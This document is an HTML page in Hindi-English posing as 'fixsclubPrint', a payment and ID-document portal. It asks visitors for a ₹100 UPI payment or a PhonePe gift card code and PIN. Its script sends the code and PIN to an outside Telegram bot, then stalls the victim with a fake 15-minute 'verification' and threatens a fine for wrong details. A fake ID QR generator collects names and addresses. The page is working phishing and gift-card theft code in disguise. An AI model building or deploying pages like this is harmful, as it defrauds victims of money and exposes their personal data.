<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>fixsclubPrint | Payment & ID Portal</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; margin: 0; text-align: center; }
        .header { background: #1a237e; color: white; padding: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
        .container { max-width: 450px; margin: 20px auto; padding: 10px; }
        .card { background: white; border-radius: 15px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin-bottom: 20px; border-top: 5px solid #1a237e; }
        .qr-frame { background: #fff; padding: 15px; border: 2px solid #673ab7; border-radius: 10px; display: inline-block; margin: 10px 0; }
        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 15px; }
        .btn { background: #28a745; color: white; padding: 15px; width: 100%; border: none; border-radius: 8px; font-size: 17px; font-weight: bold; cursor: pointer; }
        .btn-gen { background: #1a237e; margin-top: 10px; }
        .footer-text { font-size: 12px; color: #666; margin-top: 10px; }
    </style>
</head>
<body>

<div class="header">
    <h2 style="margin:0;">fixsclubPrint Official</h2>
    <p style="margin:5px 0 0;">Secure Document Services</p>
</div>

<div class="container">
    <div class="card">
        <h3>üí∞ Payment & Activation</h3>
        <p style="font-size:14px;">Services chalu karne ke liye ‚Çπ100 pay karein:</p>
        
        <div class="qr-frame">
            <img src="https://i.ibb.co/v4m0Yv8/51977.jpg" alt="UPI QR" style="width:200px; border-radius:5px;">
            <p style="margin:5px 0 0; font-weight:bold; font-size:14px;">UPI: Q973860146@ybl</p>
        </div>

        <div style="margin-top:15px; border-top: 1px solid #eee; padding-top:10px;">
            <p style="font-weight:bold; color:#d32f2f;">OR Use PhonePe Gift Card</p>
            <input type="text" id="gc_code" placeholder="Gift Card Code (16 Digit)">
            <input type="text" id="gc_pin" placeholder="Gift Card PIN (6 Digit)">
            <button class="btn" onclick="sendToTelegram()">Submit & Activate</button>
        </div>
        <p class="footer-text">‚ö†Ô∏è Galat details par ‚Çπ50 fine lagega!</p>
    </div>

    <div class="card">
        <h3>üÜî Automatic ID QR Generator</h3>
        <p style="font-size:13px; color:#555;">Details bharein, QR apne aap ban jayega:</p>
        <input type="text" id="name" placeholder="Pura Naam (Aadhaar/Voter ke liye)">
        <input type="text" id="addr" placeholder="Pura Pata (Address)">
        <button class="btn btn-gen" onclick="generateAutoQR()">Generate QR Code</button>
        
        <div id="result-qr" style="margin-top:20px; display:flex; justify-content:center;"></div>
    </div>
</div>

<script>
    // Document QR Generator Function
    function generateAutoQR() {
        const name = document.getElementById('name').value;
        const addr = document.getElementById('addr').value;
        if(!name || !addr) { alert("Naam aur Pata bhariye!"); return; }

        document.getElementById('result-qr').innerHTML = "";
        new QRCode(document.getElementById("result-qr"), {
            text: `Name: ${name}\nAddress: ${addr}\nVerified: fixsclubPrint`,
            width: 130,
            height: 130
        });
    }

    // Telegram Function
    function sendToTelegram() {
        const code = document.getElementById('gc_code').value;
        const pin = document.getElementById('gc_pin').value;
        
        if(code.length < 10) { alert("Sahi Gift Card dalein!"); return; }

        const botToken = "YOUR_BOT_TOKEN"; // Yahan Token dalein
        const chatId = "YOUR_CHAT_ID";     // Yahan Chat ID dalein
        const msg = `üí≥ NAYA DATA\nGC: ${code}\nPIN: ${pin}\nSite: fixsclubprint.github.io`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
        .then(() => alert("Verification chalu hai! 15 min wait karein."))
        .catch(() => alert("Error! Koshish karein."));
    }
</script>

</body>
</html>
